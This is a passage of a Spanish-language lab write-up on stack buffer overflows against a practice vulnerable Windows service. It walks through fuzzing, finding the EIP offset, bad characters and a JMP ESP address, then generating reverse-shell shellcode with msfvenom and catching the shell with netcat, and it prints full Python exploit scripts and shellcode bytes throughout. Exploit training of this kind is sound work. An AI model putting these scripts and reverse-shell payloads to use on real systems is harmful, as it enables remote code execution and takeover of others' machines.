\u0026#34;\\x47\\x2d\\x4a\\x94\\x45\\xa4\\xb9\\xb7\\x4c\\xc2\\xc9\\x46\\xed\\x49\\x10\u0026#34; \u0026#34;\\x3c\\x63\\x35\\x69\\x2f\\x45\\xcd\\xa9\\x61\\x7b\\xc2\\xc9\\xab\\x4e\\x50\u0026#34; \u0026#34;\\x78\\xc3\\xa4\\xde\\x4b\\x94\\x7a\\x0c\\xea\\xa9\\x3f\\x64\\x4a\\x21\\xd0\u0026#34; \u0026#34;\\x5b\\xdb\\x87\\x09\\x01\\x1d\\xc2\\xa0\\x79\\x38\\xd3\\xeb\\x3d\\x58\\x97\u0026#34; \u0026#34;\\x7d\\x6b\\x4a\\x95\\x6b\\x6b\\x52\\x95\\x7b\\x6e\\x4a\\xab\\x54\\xf1\\x23\u0026#34; \u0026#34;\\x45\\xd2\\xe8\\x95\\x23\\x63\\x6b\\x5a\\x3c\\x1d\\x55\\x14\\x44\\x30\\x5d\u0026#34; \u0026#34;\\xe3\\x16\\x96\\xdd\\x01\\xe9\\x27\\x55\\xba\\x56\\x90\\xa0\\xe3\\x16\\x11\u0026#34; \u0026#34;\\x3b\\x60\\xc9\\xad\\xc6\\xfc\\xb6\\x28\\x86\\x5b\\xd0\\x5f\\x52\\x76\\xc3\u0026#34; \u0026#34;\\x7e\\xc2\\xc9\u0026#34;) eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x625011eb) nops = \u0026#34;\\x90\u0026#34; * 16 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1306 + eip_ret + nops + shellcode + padding * (1750 - 1306 - 4 - 16 - 348) try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW7 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 ➜ OVERFLOW_7 nc -lvnp 1338 Listening on 0.0.0.0 1338 Connection received on 192.168.22.128 49161 Microsoft Windows [Versin 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;echo %username% echo %username% sckull C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt; Overflow 8 Fuzzing Realizamos fuzzing al segundo reto utilizando esta vez OVERFLOW8.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 30: buff.append(\u0026#34;A\u0026#34;*c) c += 100 p1 = log.progress(\u0026#34;Progreso\u0026#34;) for string in buff: try: p1.status(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW8 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) sys.exit(1) Encontramos que el programa se detuvo con 1900 bytes.\n1 2 3 4 ➜ OVERFLOW_8 ./overflow8.py 192.168.22.128 [|] Progreso: Enviando 1900 bytes. [-] Parece que el programa se detuvo con 1900 bytes. ➜ OVERFLOW_8 Observamos que el registro EIP se sobreescribió con “A\u0026quot;s, tambien vemos el registro ESP con los mismos valores.\nOffset EIP Creamos un patron de 2100 bytes utilizando pattern_create.rb.\n1 2 3 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_create.rb -l 2100 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9 Modificamos el script para realizar el envio de este.\n1 2 3 4 5 6 7 8 9 10 11 12 13 buff = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9\u0026#34; try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW8 %s\\r\\n\u0026#34; % buff) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34;) El registro EIP está lleno con el patron enviado asi mismo el registro ESP.\nMona nos muestra el offset con valor de 1786 bytes.\n1 2 3 4 5 6 7 8 9 # !mona findmsp -distance 2100 [+] Command used: !mona findmsp -distance 2100 [..] [+] Examining registers EIP contains normal pattern : 0x68433568 (offset 1786) ESP (0x0186fa30) points at offset 1790 in normal pattern (length 310) EBP contains normal pattern : 0x43346843 (offset 1782) EBX contains normal pattern : 0x33684332 (offset 1778) Control EIP Utilizando la longitud del offset agregamos “B\u0026quot;s para confirmar que el offset es exacto y que tenemos el control del registro EIP, además agregamos un padding para mantener la longitud del buffer (2100).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1786 + eip_ret + nops + padding * (2100-1786-4) # junk 1786, eip 4, padding 310 = 2100 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW8 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script vemos que el registro EIP contiene “B\u0026quot;s lo que significa que el offset es exacto, además vemos el registro ESP con el padding (“C\u0026quot;s).\nEspacio - Shellcode Aumentamos el padding para tener asegurado un espacio ‘decente’ para nuestro shellcode, en este caso 120 bytes adicionales, en total tendríamos 430 bytes disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1786 + eip_ret + nops + padding * (2100 - 1786 - 4 + 120) # padding 430 # 1786 junk, 4 eip_ret, padding 430 (shellcode + nops) # total buffer = 2220 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW8 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) El debugger muestra el mismo comportamiento por lo que tomamos la longitud del buffer en 2220 bytes de los cuales 430 bytes serán para el shellcode y los nops (16 bytes).\nBadChars Generamos con mona un array con todos los badchars exeptuando el valor null (\\x00).\n1 !mona bytearray -cpb \u0026#34;\\x00\u0026#34; Modificamos el script con nuestro array de badchars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 badchars = (\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1786 + eip_ret + nops + badchars + padding * (2220 - 1786 - 4 - 255) # 255 badchars try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW8 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Realizamos la busqueda de badchars como en el primer reto. Inicialmente encontramos los badchars \u0026quot;\\x00\\x1d\\x2e\\xc7\\xee\u0026quot;.\n1 \\x00\\x1d\\x2e\\xc7\\xee JMP ESP Buscamos una instrucción de salto al ESP con mona.\n1 2 !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x1d\\x2e\\xc7\\xee\u0026#34; !mona jmp -r esp -cpb \u0026#34;\\x00\\x1d\\x2e\\xc7\\xee\u0026#34; Encontramos dos direcciones de memoria con la instrucción jmp esp sin ningun tipo de protección.\n1 2 3 4 5 6 7 8 9 10 11 12 13 [+] Command used: !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x1d\\x2e\\xc7\\xee\u0026#34; [..] [+] Results : 0x625011af : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011bb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011d3 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011df : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011eb : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x625011f7 : \u0026#39;jmp esp\u0026#39; | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501203 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501205 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) Found a total of 8 pointers Modificamos nuestr script agregando la dirección de la instrucción.\n1 2 3 from struct import pack eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x62501203) Shellcode Creamos nuestro shellcode pasandole los badchars que encontramos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.22.1 LPORT=1338 -a x86 --platform windows -f c -b \u0026#34;\\x00\\x1d\\x2e\\xc7\\xee\u0026#34; Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of c file: 1500 bytes unsigned char buf[] = \u0026#34;\\xba\\x2d\\xfe\\xbd\\xed\\xda\\xc9\\xd9\\x74\\x24\\xf4\\x5e\\x31\\xc9\\xb1\u0026#34; \u0026#34;\\x52\\x31\\x56\\x12\\x83\\xc6\\x04\\x03\\x7b\\xf0\\x5f\\x18\\x7f\\xe4\\x22\u0026#34; \u0026#34;\\xe3\\x7f\\xf5\\x42\\x6d\\x9a\\xc4\\x42\\x09\\xef\\x77\\x73\\x59\\xbd\\x7b\u0026#34; \u0026#34;\\xf8\\x0f\\x55\\x0f\\x8c\\x87\\x5a\\xb8\\x3b\\xfe\\x55\\x39\\x17\\xc2\\xf4\u0026#34; \u0026#34;\\xb9\\x6a\\x17\\xd6\\x80\\xa4\\x6a\\x17\\xc4\\xd9\\x87\\x45\\x9d\\x96\\x3a\u0026#34; \u0026#34;\\x79\\xaa\\xe3\\x86\\xf2\\xe0\\xe2\\x8e\\xe7\\xb1\\x05\\xbe\\xb6\\xca\\x5f\u0026#34; \u0026#34;\\x60\\x39\\x1e\\xd4\\x29\\x21\\x43\\xd1\\xe0\\xda\\xb7\\xad\\xf2\\x0a\\x86\u0026#34; \u0026#34;\\x4e\\x58\\x73\\x26\\xbd\\xa0\\xb4\\x81\\x5e\\xd7\\xcc\\xf1\\xe3\\xe0\\x0b\u0026#34; \u0026#34;\\x8b\\x3f\\x64\\x8f\\x2b\\xcb\\xde\\x6b\\xcd\\x18\\xb8\\xf8\\xc1\\xd5\\xce\u0026#34; \u0026#34;\\xa6\\xc5\\xe8\\x03\\xdd\\xf2\\x61\\xa2\\x31\\x73\\x31\\x81\\x95\\xdf\\xe1\u0026#34; \u0026#34;\\xa8\\x8c\\x85\\x44\\xd4\\xce\\x65\\x38\\x70\\x85\\x88\\x2d\\x09\\xc4\\xc4\u0026#34; \u0026#34;\\x82\\x20\\xf6\\x14\\x8d\\x33\\x85\\x26\\x12\\xe8\\x01\\x0b\\xdb\\x36\\xd6\u0026#34; \u0026#34;\\x6c\\xf6\\x8f\\x48\\x93\\xf9\\xef\\x41\\x50\\xad\\xbf\\xf9\\x71\\xce\\x2b\u0026#34; \u0026#34;\\xf9\\x7e\\x1b\\xfb\\xa9\\xd0\\xf4\\xbc\\x19\\x91\\xa4\\x54\\x73\\x1e\\x9a\u0026#34; \u0026#34;\\x45\\x7c\\xf4\\xb3\\xec\\x87\\x9f\\x7b\\x58\\x91\\x5e\\x14\\x9b\\x9d\\x65\u0026#34; \u0026#34;\\xde\\x12\\x7b\\x0f\\x0e\\x73\\xd4\\xb8\\xb7\\xde\\xae\\x59\\x37\\xf5\\xcb\u0026#34; \u0026#34;\\x5a\\xb3\\xfa\\x2c\\x14\\x34\\x76\\x3e\\xc1\\xb4\\xcd\\x1c\\x44\\xca\\xfb\u0026#34; \u0026#34;\\x08\\x0a\\x59\\x60\\xc8\\x45\\x42\\x3f\\x9f\\x02\\xb4\\x36\\x75\\xbf\\xef\u0026#34; \u0026#34;\\xe0\\x6b\\x42\\x69\\xca\\x2f\\x99\\x4a\\xd5\\xae\\x6c\\xf6\\xf1\\xa0\\xa8\u0026#34; \u0026#34;\\xf7\\xbd\\x94\\x64\\xae\\x6b\\x42\\xc3\\x18\\xda\\x3c\\x9d\\xf7\\xb4\\xa8\u0026#34; \u0026#34;\\x58\\x34\\x07\\xae\\x64\\x11\\xf1\\x4e\\xd4\\xcc\\x44\\x71\\xd9\\x98\\x40\u0026#34; \u0026#34;\\x0a\\x07\\x39\\xae\\xc1\\x83\\x59\\x4d\\xc3\\xf9\\xf1\\xc8\\x86\\x43\\x9c\u0026#34; \u0026#34;\\xea\\x7d\\x87\\x99\\x68\\x77\\x78\\x5e\\x70\\xf2\\x7d\\x1a\\x36\\xef\\x0f\u0026#34; \u0026#34;\\x33\\xd3\\x0f\\xa3\\x34\\xf6\u0026#34;; Agregamos nuestro shellcode y NOPs, finalmente calculamos el padding para mantener la longitud de nuestro buffer (2220).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 shellcode = (\u0026#34;\\xba\\x2d\\xfe\\xbd\\xed\\xda\\xc9\\xd9\\x74\\x24\\xf4\\x5e\\x31\\xc9\\xb1\u0026#34; \u0026#34;\\x52\\x31\\x56\\x12\\x83\\xc6\\x04\\x03\\x7b\\xf0\\x5f\\x18\\x7f\\xe4\\x22\u0026#34; \u0026#34;\\xe3\\x7f\\xf5\\x42\\x6d\\x9a\\xc4\\x42\\x09\\xef\\x77\\x73\\x59\\xbd\\x7b\u0026#34; 